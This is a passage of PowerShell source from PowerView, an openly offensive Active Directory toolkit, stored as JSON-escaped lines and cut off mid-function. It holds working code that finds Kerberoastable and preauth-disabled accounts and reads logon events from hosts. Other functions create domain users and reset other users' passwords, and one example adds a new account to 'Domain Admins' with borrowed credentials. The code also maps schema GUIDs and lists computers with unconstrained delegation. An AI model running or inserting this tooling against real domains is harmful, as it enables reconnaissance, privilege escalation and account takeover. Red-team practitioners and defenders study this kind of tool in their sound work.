$SearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }","        if ($PSBoundParameters['SecurityMasks']) { $SearcherArguments['SecurityMasks'] = $SecurityMasks }","        if ($PSBoundParameters['Tombstone']) { $SearcherArguments['Tombstone'] = $Tombstone }","        if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }","        $UserSearcher = Get-DomainSearcher @SearcherArguments","    }","","    PROCESS {","        #bind dynamic parameter to a friendly variable","        if ($PSBoundParameters -and ($PSBoundParameters.Count -ne 0)) {","            New-DynamicParameter -CreateVariables -BoundParameters $PSBoundParameters","        }","","        if ($UserSearcher) {","            $IdentityFilter = ''","            $Filter = ''","            $Identity | Where-Object {$_} | ForEach-Object {","                $IdentityInstance = $_.Replace('(', '\\28').Replace(')', '\\29')","                if ($IdentityInstance -match '^S-1-') {","                    $IdentityFilter += \"(objectsid=$IdentityInstance)\"","                }","                elseif ($IdentityInstance -match '^CN=') {","                    $IdentityFilter += \"(distinguishedname=$IdentityInstance)\"","                    if ((-not $PSBoundParameters['Domain']) -and (-not $PSBoundParameters['SearchBase'])) {","                        # if a -Domain isn't explicitly set, extract the object domain out of the distinguishedname","                        #   and rebuild the domain searcher","                        $IdentityDomain = $IdentityInstance.SubString($IdentityInstance.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'","                        Write-Verbose \"[Get-DomainUser] Extracted domain '$IdentityDomain' from '$IdentityInstance'\"","                        $SearcherArguments['Domain'] = $IdentityDomain","                        $UserSearcher = Get-DomainSearcher @SearcherArguments","                        if (-not $UserSearcher) {","                            Write-Warning \"[Get-DomainUser] Unable to retrieve domain searcher for '$IdentityDomain'\"","                        }","                    }","                }","                elseif ($IdentityInstance -imatch '^[0-9A-F]{8}-([0-9A-F]{4}-){3}[0-9A-F]{12}$') {","                    $GuidByteString = (([Guid]$IdentityInstance).ToByteArray() | ForEach-Object { '\\' + $_.ToString('X2') }) -join ''","                    $IdentityFilter += \"(objectguid=$GuidByteString)\"","                }","                elseif ($IdentityInstance.Contains('\\')) {","                    $ConvertedIdentityInstance = $IdentityInstance.Replace('\\28', '(').Replace('\\29', ')') | Convert-ADName -OutputType Canonical","                    if ($ConvertedIdentityInstance) {","                        $UserDomain = $ConvertedIdentityInstance.SubString(0, $ConvertedIdentityInstance.IndexOf('/'))","                        $UserName = $IdentityInstance.Split('\\')[1]","                        $IdentityFilter += \"(samAccountName=$UserName)\"","                        $SearcherArguments['Domain'] = $UserDomain","                        Write-Verbose \"[Get-DomainUser] Extracted domain '$UserDomain' from '$IdentityInstance'\"","                        $UserSearcher = Get-DomainSearcher @SearcherArguments","                    }","                }","                else {","                    $IdentityFilter += \"(samAccountName=$IdentityInstance)\"","                }","            }","","            if ($IdentityFilter -and ($IdentityFilter.Trim() -ne '') ) {","                $Filter += \"(|$IdentityFilter)\"","            }","","            if ($PSBoundParameters['SPN']) {","                Write-Verbose '[Get-DomainUser] Searching for non-null service principal names'","                $Filter += '(servicePrincipalName=*)'","            }","            if ($PSBoundParameters['AllowDelegation']) {","                Write-Verbose '[Get-DomainUser] Searching for users who can be delegated'","                # negation of \"Accounts that are sensitive and not trusted for delegation\"","                $Filter += '(!(userAccountControl:1.2.840.113556.1.4.803:=1048574))'","            }","            if ($PSBoundParameters['DisallowDelegation']) {","                Write-Verbose '[Get-DomainUser] Searching for users who are sensitive and not trusted for delegation'","                $Filter += '(userAccountControl:1.2.840.113556.1.4.803:=1048574)'","            }","            if ($PSBoundParameters['AdminCount']) {","                Write-Verbose '[Get-DomainUser] Searching for adminCount=1'","                $Filter += '(admincount=1)'","            }","            if ($PSBoundParameters['TrustedToAuth']) {","                Write-Verbose '[Get-DomainUser] Searching for users that are trusted to authenticate for other principals'","                $Filter += '(msds-allowedtodelegateto=*)'","            }","            if ($PSBoundParameters['PreauthNotRequired']) {","                Write-Verbose '[Get-DomainUser] Searching for user accounts that do not require kerberos preauthenticate'","                $Filter += '(userAccountControl:1.2.840.113556.1.4.803:=4194304)'","            }","            if ($PSBoundParameters['LDAPFilter']) {","                Write-Verbose \"[Get-DomainUser] Using additional LDAP filter: $LDAPFilter\"","                $Filter += \"$LDAPFilter\"","            }","","            # build the LDAP filter for the dynamic UAC filter value","            $UACFilter | Where-Object {$_} | ForEach-Object {","                if ($_ -match 'NOT_.*') {","                    $UACField = $_.Substring(4)","                    $UACValue = [Int]($UACEnum::$UACField)","                    $Filter += \"(!(userAccountControl:1.2.840.113556.1.4.803:=$UACValue))\"","                }","                else {","                    $UACValue = [Int]($UACEnum::$_)","                    $Filter += \"(userAccountControl:1.2.840.113556.1.4.803:=$UACValue)\"","                }","            }","","            $UserSearcher.filter = \"(\u0026(samAccountType=805306368)$Filter)\"","            Write-Verbose \"[Get-DomainUser] filter string: $($UserSearcher.filter)\"","","            if ($PSBoundParameters['FindOne']) { $Results = $UserSearcher.FindOne() }","            else { $Results = $UserSearcher.FindAll() }","            $Results | Where-Object {$_} | ForEach-Object {","                if ($PSBoundParameters['Raw']) {","                    # return raw result objects","                    $User = $_","                    $User.PSObject.TypeNames.Insert(0, 'PowerView.User.Raw')","                }","                else {","                    $User = Convert-LDAPProperty -Properties $_.Properties","                    $User.PSObject.TypeNames.Insert(0, 'PowerView.User')","                }","                $User","            }","            if ($Results) {","                try { $Results.dispose() }","                catch {","                    Write-Verbose \"[Get-DomainUser] Error disposing of the Results object: $_\"","                }","            }","            $UserSearcher.dispose()","        }","    }","}","","","function New-DomainUser {","\u003c#",".SYNOPSIS","","Creates a new domain user (assuming appropriate permissions) and returns the user object.","","TODO: implement all properties that New-ADUser implements (https://technet.microsoft.com/en-us/library/ee617253.aspx).","","Author: Will Schroeder (@harmj0y)  ","License: BSD 3-Clause  ","Required Dependencies: Get-PrincipalContext  ","",".DESCRIPTION","","First binds to the specified domain context using Get-PrincipalContext.","The bound domain context is then used to create a new","DirectoryServices.AccountManagement.UserPrincipal with the specified user properties.","",".PARAMETER SamAccountName","","Specifies the Security Account Manager (SAM) account name of the user to create.","Maximum of 256 characters. Mandatory.","",".PARAMETER AccountPassword","","Specifies the password for the created user. Mandatory.","",".PARAMETER Name","","Specifies the name of the user to create. If not provided, defaults to SamAccountName.","",".PARAMETER DisplayName","","Specifies the display name of the user to create. If not provided, defaults to SamAccountName.","",".PARAMETER Description","","Specifies the description of the user to create.","",".PARAMETER Domain","","Specifies the domain to use to search for user/group principals, defaults to the current domain.","",".PARAMETER Credential","","A [Management.Automation.PSCredential] object of alternate credentials","for connection to the target domain.","",".EXAMPLE","","$UserPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force","New-DomainUser -SamAccountName harmj0y2 -Description 'This is harmj0y' -AccountPassword $UserPassword","","Creates the 'harmj0y2' user with the specified description and password.","",".EXAMPLE","","$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force","$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)","$UserPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force","$user = New-DomainUser -SamAccountName harmj0y2 -Description 'This is harmj0y' -AccountPassword $UserPassword -Credential $Cred","","Creates the 'harmj0y2' user with the specified description and password, using the specified","alternate credentials.","",".EXAMPLE","","$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force","$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)","$UserPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force","New-DomainUser -SamAccountName andy -AccountPassword $UserPassword -Credential $Cred | Add-DomainGroupMember 'Domain Admins' -Credential $Cred","","Creates the 'andy' user with the specified description and password, using the specified","alternate credentials, and adds the user to 'domain admins' using Add-DomainGroupMember","and the alternate credentials.","",".OUTPUTS","","DirectoryServices.AccountManagement.UserPrincipal","",".LINK","","http://richardspowershellblog.wordpress.com/2008/05/25/system-directoryservices-accountmanagement/","#\u003e","","    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]","    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]","    [OutputType('DirectoryServices.AccountManagement.UserPrincipal')]","    Param(","        [Parameter(Mandatory = $True)]","        [ValidateLength(0, 256)]","        [String]","        $SamAccountName,","","        [Parameter(Mandatory = $True)]","        [ValidateNotNullOrEmpty()]","        [Alias('Password')]","        [Security.SecureString]","        $AccountPassword,","","        [ValidateNotNullOrEmpty()]","        [String]","        $Name,","","        [ValidateNotNullOrEmpty()]","        [String]","        $DisplayName,","","        [ValidateNotNullOrEmpty()]","        [String]","        $Description,","","        [ValidateNotNullOrEmpty()]","        [String]","        $Domain,","","        [Management.Automation.PSCredential]","        [Management.Automation.CredentialAttribute()]","        $Credential = [Management.Automation.PSCredential]::Empty","    )","","    $ContextArguments = @{","        'Identity' = $SamAccountName","    }","    if ($PSBoundParameters['Domain']) { $ContextArguments['Domain'] = $Domain }","    if ($PSBoundParameters['Credential']) { $ContextArguments['Credential'] = $Credential }","    $Context = Get-PrincipalContext @ContextArguments","","    if ($Context) {","        $User = New-Object -TypeName System.DirectoryServices.AccountManagement.UserPrincipal -ArgumentList ($Context.Context)","","        # set all the appropriate user parameters","        $User.SamAccountName = $Context.Identity","        $TempCred = New-Object System.Management.Automation.PSCredential('a', $AccountPassword)","        $User.SetPassword($TempCred.GetNetworkCredential().Password)","        $User.Enabled = $True","        $User.PasswordNotRequired = $False","","        if ($PSBoundParameters['Name']) {","            $User.Name = $Name","        }","        else {","            $User.Name = $Context.Identity","        }","        if ($PSBoundParameters['DisplayName']) {","            $User.DisplayName = $DisplayName","        }","        else {","            $User.DisplayName = $Context.Identity","        }","","        if ($PSBoundParameters['Description']) {","            $User.Description = $Description","        }","","        Write-Verbose \"[New-DomainUser] Attempting to create user '$SamAccountName'\"","        try {","            $Null = $User.Save()","            Write-Verbose \"[New-DomainUser] User '$SamAccountName' successfully created\"","            $User","        }","        catch {","            Write-Warning \"[New-DomainUser] Error creating user '$SamAccountName' : $_\"","        }","    }","}","","","function Set-DomainUserPassword {","\u003c#",".SYNOPSIS","","Sets the password for a given user identity.","","Author: Will Schroeder (@harmj0y)  ","License: BSD 3-Clause  ","Required Dependencies: Get-PrincipalContext  ","",".DESCRIPTION","","First binds to the specified domain context using Get-PrincipalContext.","The bound domain context is then used to search for the specified user -Identity,","which returns a DirectoryServices.AccountManagement.UserPrincipal object. The","SetPassword() function is then invoked on the user, setting the password to -AccountPassword.","",".PARAMETER Identity","","A user SamAccountName (e.g. User1), DistinguishedName (e.g. CN=user1,CN=Users,DC=testlab,DC=local),","SID (e.g. S-1-5-21-890171859-3433809279-3366196753-1113), or GUID (e.g. 4c435dd7-dc58-4b14-9a5e-1fdb0e80d201)","specifying the user to reset the password for.","",".PARAMETER AccountPassword","","Specifies the password to reset the target user's to. Mandatory.","",".PARAMETER Domain","","Specifies the domain to use to search for the user identity, defaults to the current domain.","",".PARAMETER Credential","","A [Management.Automation.PSCredential] object of alternate credentials","for connection to the target domain.","",".EXAMPLE","","$UserPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force","Set-DomainUserPassword -Identity andy -AccountPassword $UserPassword","","Resets the password for 'andy' to the password specified.","",".EXAMPLE","","$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force","$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)","$UserPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force","Set-DomainUserPassword -Identity andy -AccountPassword $UserPassword -Credential $Cred","","Resets the password for 'andy' usering the alternate credentials specified.","",".OUTPUTS","","DirectoryServices.AccountManagement.UserPrincipal","",".LINK","","http://richardspowershellblog.wordpress.com/2008/05/25/system-directoryservices-accountmanagement/","#\u003e","","    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]","    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]","    [OutputType('DirectoryServices.AccountManagement.UserPrincipal')]","    Param(","        [Parameter(Position = 0, Mandatory = $True)]","        [Alias('UserName', 'UserIdentity', 'User')]","        [String]","        $Identity,","","        [Parameter(Mandatory = $True)]","        [ValidateNotNullOrEmpty()]","        [Alias('Password')]","        [Security.SecureString]","        $AccountPassword,","","        [ValidateNotNullOrEmpty()]","        [String]","        $Domain,","","        [Management.Automation.PSCredential]","        [Management.Automation.CredentialAttribute()]","        $Credential = [Management.Automation.PSCredential]::Empty","    )","","    $ContextArguments = @{ 'Identity' = $Identity }","    if ($PSBoundParameters['Domain']) { $ContextArguments['Domain'] = $Domain }","    if ($PSBoundParameters['Credential']) { $ContextArguments['Credential'] = $Credential }","    $Context = Get-PrincipalContext @ContextArguments","","    if ($Context) {","        $User = [System.DirectoryServices.AccountManagement.UserPrincipal]::FindByIdentity($Context.Context, $Identity)","","        if ($User) {","            Write-Verbose \"[Set-DomainUserPassword] Attempting to set the password for user '$Identity'\"","            try {","                $TempCred = New-Object System.Management.Automation.PSCredential('a', $AccountPassword)","                $User.SetPassword($TempCred.GetNetworkCredential().Password)","","                $Null = $User.Save()","                Write-Verbose \"[Set-DomainUserPassword] Password for user '$Identity' successfully reset\"","            }","            catch {","                Write-Warning \"[Set-DomainUserPassword] Error setting password for user '$Identity' : $_\"","            }","        }","        else {","            Write-Warning \"[Set-DomainUserPassword] Unable to find user '$Identity'\"","        }","    }","}","","","function Get-DomainUserEvent {","\u003c#",".SYNOPSIS","","Enumerate account logon events (ID 4624) and Logon with explicit credential","events (ID 4648) from the specified host (default of the localhost).","","Author: Lee Christensen (@tifkin_), Justin Warner (@sixdub), Will Schroeder (@harmj0y)  ","License: BSD 3-Clause  ","Required Dependencies: None  ","",".DESCRIPTION","","This function uses an XML path filter passed to Get-WinEvent to retrieve","security events with IDs of 4624 (logon events) or 4648 (explicit credential","logon events) from -StartTime (default of now-1 day) to -EndTime (default of now).","A maximum of -MaxEvents (default of 5000) are returned.","",".PARAMETER ComputerName","","Specifies the computer name to retrieve events from, default of localhost.","",".PARAMETER StartTime","","The [DateTime] object representing the start of when to collect events.","Default of [DateTime]::Now.AddDays(-1).","",".PARAMETER EndTime","","The [DateTime] object representing the end of when to collect events.","Default of [DateTime]::Now.","",".PARAMETER MaxEvents","","The maximum number of events to retrieve. Default of 5000.","",".PARAMETER Credential","","A [Management.Automation.PSCredential] object of alternate credentials","for connection to the target computer.","",".EXAMPLE","","Get-DomainUserEvent","","Return logon events on the local machine.","",".EXAMPLE","","Get-DomainController | Get-DomainUserEvent -StartTime ([DateTime]::Now.AddDays(-3))","","Return all logon events from the last 3 days from every domain controller in the current domain.","",".EXAMPLE","","$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force","$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)","Get-DomainUserEvent -ComputerName PRIMARY.testlab.local -Credential $Cred -MaxEvents 1000","","Return a max of 1000 logon events from the specified machine using the specified alternate credentials.","",".OUTPUTS","","PowerView.LogonEvent","","PowerView.ExplicitCredentialLogonEvent","",".LINK","","http://www.sixdub.net/2014/11/07/offensive-event-parsing-bringing-home-trophies/","#\u003e","","    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]","    [OutputType('PowerView.LogonEvent')]","    [OutputType('PowerView.ExplicitCredentialLogonEvent')]","    [CmdletBinding()]","    Param(","        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]","        [Alias('dnshostname', 'HostName', 'name')]","        [ValidateNotNullOrEmpty()]","        [String[]]","        $ComputerName = $Env:COMPUTERNAME,","","        [ValidateNotNullOrEmpty()]","        [DateTime]","        $StartTime = [DateTime]::Now.AddDays(-1),","","        [ValidateNotNullOrEmpty()]","        [DateTime]","        $EndTime = [DateTime]::Now,","","        [ValidateRange(1, 1000000)]","        [Int]","        $MaxEvents = 5000,","","        [Management.Automation.PSCredential]","        [Management.Automation.CredentialAttribute()]","        $Credential = [Management.Automation.PSCredential]::Empty","    )","","    BEGIN {","        # the XML filter we're passing to Get-WinEvent","        $XPathFilter = @\"","\u003cQueryList\u003e","    \u003cQuery Id=\"0\" Path=\"Security\"\u003e","","        \u003c!-- Logon events --\u003e","        \u003cSelect Path=\"Security\"\u003e","            *[","                System[","                    Provider[","                        @Name='Microsoft-Windows-Security-Auditing'","                    ]","                    and (Level=4 or Level=0) and (EventID=4624)","                    and TimeCreated[","                        @SystemTime\u0026gt;='$($StartTime.ToUniversalTime().ToString('s'))' and @SystemTime\u0026lt;='$($EndTime.ToUniversalTime().ToString('s'))'","                    ]","                ]","            ]","            and","            *[EventData[Data[@Name='TargetUserName'] != 'ANONYMOUS LOGON']]","        \u003c/Select\u003e","","        \u003c!-- Logon with explicit credential events --\u003e","        \u003cSelect Path=\"Security\"\u003e","            *[","                System[","                    Provider[","                        @Name='Microsoft-Windows-Security-Auditing'","                    ]","                    and (Level=4 or Level=0) and (EventID=4648)","                    and TimeCreated[","                        @SystemTime\u0026gt;='$($StartTime.ToUniversalTime().ToString('s'))' and @SystemTime\u0026lt;='$($EndTime.ToUniversalTime().ToString('s'))'","                    ]","                ]","            ]","        \u003c/Select\u003e","","        \u003cSuppress Path=\"Security\"\u003e","            *[","                System[","                    Provider[","                        @Name='Microsoft-Windows-Security-Auditing'","                    ]","                    and","                    (Level=4 or Level=0) and (EventID=4624 or EventID=4625 or EventID=4634)","                ]","            ]","            and","            *[","                EventData[","                    (","                        (Data[@Name='LogonType']='5' or Data[@Name='LogonType']='0')","                        or","                        Data[@Name='TargetUserName']='ANONYMOUS LOGON'","                        or","                        Data[@Name='TargetUserSID']='S-1-5-18'","                    )","                ]","            ]","        \u003c/Suppress\u003e","    \u003c/Query\u003e","\u003c/QueryList\u003e","\"@","        $EventArguments = @{","            'FilterXPath' = $XPathFilter","            'LogName' = 'Security'","            'MaxEvents' = $MaxEvents","        }","        if ($PSBoundParameters['Credential']) { $EventArguments['Credential'] = $Credential }","    }","","    PROCESS {","        ForEach ($Computer in $ComputerName) {","","            $EventArguments['ComputerName'] = $Computer","","            Get-WinEvent @EventArguments| ForEach-Object {","                $Event = $_","                $Properties = $Event.Properties","                Switch ($Event.Id) {","                    # logon event","                    4624 {","                        # skip computer logons, for now...","                        if(-not $Properties[5].Value.EndsWith('$')) {","                            $Output = New-Object PSObject -Property @{","                                ComputerName              = $Computer","                                TimeCreated               = $Event.TimeCreated","                                EventId                   = $Event.Id","                                SubjectUserSid            = $Properties[0].Value.ToString()","                                SubjectUserName           = $Properties[1].Value","                                SubjectDomainName         = $Properties[2].Value","                                SubjectLogonId            = $Properties[3].Value","                                TargetUserSid             = $Properties[4].Value.ToString()","                                TargetUserName            = $Properties[5].Value","                                TargetDomainName          = $Properties[6].Value","                                TargetLogonId             = $Properties[7].Value","                                LogonType                 = $Properties[8].Value","                                LogonProcessName          = $Properties[9].Value","                                AuthenticationPackageName = $Properties[10].Value","                                WorkstationName           = $Properties[11].Value","                                LogonGuid                 = $Properties[12].Value","                                TransmittedServices       = $Properties[13].Value","                                LmPackageName             = $Properties[14].Value","                                KeyLength                 = $Properties[15].Value","                                ProcessId                 = $Properties[16].Value","                                ProcessName               = $Properties[17].Value","                                IpAddress                 = $Properties[18].Value","                                IpPort                    = $Properties[19].Value","                                ImpersonationLevel        = $Properties[20].Value","                                RestrictedAdminMode       = $Properties[21].Value","                                TargetOutboundUserName    = $Properties[22].Value","                                TargetOutboundDomainName  = $Properties[23].Value","                                VirtualAccount            = $Properties[24].Value","                                TargetLinkedLogonId       = $Properties[25].Value","                                ElevatedToken             = $Properties[26].Value","                            }","                            $Output.PSObject.TypeNames.Insert(0, 'PowerView.LogonEvent')","                            $Output","                        }","                    }","","                    # logon with explicit credential","                    4648 {","                        # skip computer logons, for now...","                        if((-not $Properties[5].Value.EndsWith('$')) -and ($Properties[11].Value -match 'taskhost\\.exe')) {","                            $Output = New-Object PSObject -Property @{","                                ComputerName              = $Computer","                                TimeCreated       = $Event.TimeCreated","                                EventId           = $Event.Id","                                SubjectUserSid    = $Properties[0].Value.ToString()","                                SubjectUserName   = $Properties[1].Value","                                SubjectDomainName = $Properties[2].Value","                                SubjectLogonId    = $Properties[3].Value","                                LogonGuid         = $Properties[4].Value.ToString()","                                TargetUserName    = $Properties[5].Value","                                TargetDomainName  = $Properties[6].Value","                                TargetLogonGuid   = $Properties[7].Value","                                TargetServerName  = $Properties[8].Value","                                TargetInfo        = $Properties[9].Value","                                ProcessId         = $Properties[10].Value","                                ProcessName       = $Properties[11].Value","                                IpAddress         = $Properties[12].Value","                                IpPort            = $Properties[13].Value","                            }","                            $Output.PSObject.TypeNames.Insert(0, 'PowerView.ExplicitCredentialLogonEvent')","                            $Output","                        }","                    }","                    default {","                        Write-Warning \"No handler exists for event ID: $($Event.Id)\"","                    }","                }","            }","        }","    }","}","","","function Get-DomainGUIDMap {","\u003c#",".SYNOPSIS","","Helper to build a hash table of [GUID] -\u003e resolved names for the current or specified Domain.","","Author: Will Schroeder (@harmj0y)  ","License: BSD 3-Clause  ","Required Dependencies: Get-DomainSearcher, Get-Forest  ","",".DESCRIPTION","","Searches the forest schema location (CN=Schema,CN=Configuration,DC=testlab,DC=local) for","all objects with schemaIDGUID set and translates the GUIDs discovered to human-readable names.","Then searches the extended rights location (CN=Extended-Rights,CN=Configuration,DC=testlab,DC=local)","for objects where objectClass=controlAccessRight, translating the GUIDs again.","","Heavily adapted from http://blogs.technet.com/b/ashleymcglone/archive/2013/03/25/active-directory-ou-permissions-report-free-powershell-script-download.aspx","",".PARAMETER Domain","","Specifies the domain to use for the query, defaults to the current domain.","",".PARAMETER Server","","Specifies an Active Directory server (domain controller) to bind to.","",".PARAMETER ResultPageSize","","Specifies the PageSize to set for the LDAP searcher object.","",".PARAMETER ServerTimeLimit","","Specifies the maximum amount of time the server spends searching. Default of 120 seconds.","",".PARAMETER Credential","","A [Management.Automation.PSCredential] object of alternate credentials","for connection to the target domain.","",".OUTPUTS","","Hashtable","","Ouputs a hashtable containing a GUID -\u003e Readable Name mapping.","",".LINK","","http://blogs.technet.com/b/ashleymcglone/archive/2013/03/25/active-directory-ou-permissions-report-free-powershell-script-download.aspx","#\u003e","","    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]","    [OutputType([Hashtable])]","    [CmdletBinding()]","    Param (","        [ValidateNotNullOrEmpty()]","        [String]","        $Domain,","","        [ValidateNotNullOrEmpty()]","        [Alias('DomainController')]","        [String]","        $Server,","","        [ValidateRange(1, 10000)]","        [Int]","        $ResultPageSize = 200,","","        [ValidateRange(1, 10000)]","        [Int]","        $ServerTimeLimit,","","        [Management.Automation.PSCredential]","        [Management.Automation.CredentialAttribute()]","        $Credential = [Management.Automation.PSCredential]::Empty","    )","","    $GUIDs = @{'00000000-0000-0000-0000-000000000000' = 'All'}","","    $ForestArguments = @{}","    if ($PSBoundParameters['Credential']) { $ForestArguments['Credential'] = $Credential }","","    try {","        $SchemaPath = (Get-Forest @ForestArguments).schema.name","    }","    catch {","        throw '[Get-DomainGUIDMap] Error in retrieving forest schema path from Get-Forest'","    }","    if (-not $SchemaPath) {","        throw '[Get-DomainGUIDMap] Error in retrieving forest schema path from Get-Forest'","    }","","    $SearcherArguments = @{","        'SearchBase' = $SchemaPath","        'LDAPFilter' = '(schemaIDGUID=*)'","    }","    if ($PSBoundParameters['Domain']) { $SearcherArguments['Domain'] = $Domain }","    if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }","    if ($PSBoundParameters['ResultPageSize']) { $SearcherArguments['ResultPageSize'] = $ResultPageSize }","    if ($PSBoundParameters['ServerTimeLimit']) { $SearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }","    if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }","    $SchemaSearcher = Get-DomainSearcher @SearcherArguments","","    if ($SchemaSearcher) {","        try {","            $Results = $SchemaSearcher.FindAll()","            $Results | Where-Object {$_} | ForEach-Object {","                $GUIDs[(New-Object Guid (,$_.properties.schemaidguid[0])).Guid] = $_.properties.name[0]","            }","            if ($Results) {","                try { $Results.dispose() }","                catch {","                    Write-Verbose \"[Get-DomainGUIDMap] Error disposing of the Results object: $_\"","                }","            }","            $SchemaSearcher.dispose()","        }","        catch {","            Write-Verbose \"[Get-DomainGUIDMap] Error in building GUID map: $_\"","        }","    }","","    $SearcherArguments['SearchBase'] = $SchemaPath.replace('Schema','Extended-Rights')","    $SearcherArguments['LDAPFilter'] = '(objectClass=controlAccessRight)'","    $RightsSearcher = Get-DomainSearcher @SearcherArguments","","    if ($RightsSearcher) {","        try {","            $Results = $RightsSearcher.FindAll()","            $Results | Where-Object {$_} | ForEach-Object {","                $GUIDs[$_.properties.rightsguid[0].toString()] = $_.properties.name[0]","            }","            if ($Results) {","                try { $Results.dispose() }","                catch {","                    Write-Verbose \"[Get-DomainGUIDMap] Error disposing of the Results object: $_\"","                }","            }","            $RightsSearcher.dispose()","        }","        catch {","            Write-Verbose \"[Get-DomainGUIDMap] Error in building GUID map: $_\"","        }","    }","","    $GUIDs","}","","","function Get-DomainComputer {","\u003c#",".SYNOPSIS","","Return all computers or specific computer objects in AD.","","Author: Will Schroeder (@harmj0y)  ","License: BSD 3-Clause  ","Required Dependencies: Get-DomainSearcher, Convert-LDAPProperty  ","",".DESCRIPTION","","Builds a directory searcher object using Get-DomainSearcher, builds a custom","LDAP filter based on targeting/filter parameters, and searches for all objects","matching the criteria. To only return specific properties, use","\"-Properties samaccountname,usnchanged,...\". By default, all computer objects for","the current domain are returned.","",".PARAMETER Identity","","A SamAccountName (e.g. WINDOWS10$), DistinguishedName (e.g. CN=WINDOWS10,CN=Computers,DC=testlab,DC=local),","SID (e.g. S-1-5-21-890171859-3433809279-3366196753-1124), GUID (e.g. 4f16b6bc-7010-4cbf-b628-f3cfe20f6994),","or a dns host name (e.g. windows10.testlab.local). Wildcards accepted.","",".PARAMETER UACFilter","","Dynamic parameter that accepts one or more values from $UACEnum, including","\"NOT_X\" negation forms. To see all possible values, run '0|ConvertFrom-UACValue -ShowAll'.","",".PARAMETER Unconstrained","","Switch. Return computer objects that have unconstrained delegation.","",".PARAMETER TrustedToAuth","","Switch. Return computer objects that are trusted to authenticate for other principals.","",".PARAMETER Printers","","Switch. Return only printers.","",".PARAMETER SPN","","Return computers with a specific service principal name, wildcards accepted.","",".PARAMETER OperatingSystem","","Return computers with a specific operating system, wildcards accepted.","",".PARAMETER ServicePack","","Return computers with a specific service pack, wildcards accepted.","",".PARAMETER SiteName","","Return computers in the specific AD Site name, wildcards accepted.","",".PARAMETER Ping","","Switch. Ping each host to ensure it's up before enumerating.","",".PARAMETER Domain","","Specifies the domain to use for the query, defaults to the current domain.","",".PARAMETER LDAPFilter","","Specifies an LDAP query string that is used to filter Active Directory objects.","",".PARAMETER Properties","","Specifies the properties of the output object to retrieve from the server.","",".PARAMETER SearchBase","","The LDAP source to search through, e.g. \"LDAP://OU=secret,DC=testlab,DC=local\"","Useful for OU queries.","",".PARAMETER Server","","Specifies an Active Directory server (domain controller) to bind to.","",".PARAMETER SearchScope","","Specifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).","",".PARAMETER ResultPageSize","","Specifies the PageSize to set for the LDAP searcher object.","",".PARAMETER ServerTimeLimit","","Specifies the maximum amount of time the server spends searching. Default of 120 seconds.","",".PARAMETER SecurityMasks","","Specifies an option for examining security information of a directory object.","One of 'Dacl', 'Group', 'None', 'Owner', 'Sacl'.","",".PARAMETER Tombstone","","Switch. Specifies that the searcher should also return deleted/tombstoned objects.","",".PARAMETER FindOne","","Only return one result object.","",".PARAMETER Credential","","A [Management.Automation.PSCredential] object of alternate credentials","for connection to the target domain.","",".PARAMETER Raw","","Switch. Return raw results instead of translating the fields into a custom PSObject.","",".EXAMPLE","","Get-DomainComputer","","Returns the current computers in current domain.","",".EXAMPLE","","Get-DomainComputer -SPN mssql* -Domain testlab.local","","Returns all MS SQL servers in the testlab.local domain.","",".EXAMPLE","","Get-DomainComputer -UACFilter TRUSTED_FOR_DELEGATION,SERVER_TRUST_ACCOUNT -Properties dnshostname","","Return the dns hostnames of servers trusted for delegation.","",".EXAMPLE","","Get-DomainComputer -SearchBase \"LDAP://OU=secret,DC=testlab,DC=local\" -Unconstrained","","Search the specified OU for computeres that allow unconstrained delegation.","",".EXAMPLE","","$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force","$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)","Get-DomainComputer -Credential $Cred","",".OUTPUTS","","PowerView.Computer","","Custom PSObject with translated computer property fields.","","PowerView.Computer.Raw","","The raw DirectoryServices.SearchResult object, if -Raw is enabled.","#\u003e","","    [OutputType('PowerView.Computer')]","    [OutputType('PowerView.Computer.Raw')]","    [CmdletBinding()]","    Param (","        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]","        [Alias('SamAccountName', 'Name', 'DNSHostName')]","        [String[]]","        $Identity,","","        [Switch]","        $Unconstrained,","","        [Switch]","        $TrustedToAuth,","","        [Switch]","        $Printers,","","        [ValidateNotNullOrEmpty()]","        [Alias('ServicePrincipalName')]","        [String]","        $SPN,","","        [ValidateNotNullOrEmpty()]","        [String]","        $OperatingSystem,","","        [ValidateNotNullOrEmpty()]","        [String]","        $ServicePack,","","        [ValidateNotNullOrEmpty()]","        [String]","        $SiteName,","","        [Switch]","        $Ping,","","        [ValidateNotNullOrEmpty()]","        [String]","        $Domain,","","        [ValidateNotNullOrEmpty()]","        [Alias('Filter')]","        [String]","        $LDAPFilter,","","        [ValidateNotNullOrEmpty()]","        [String[]]","        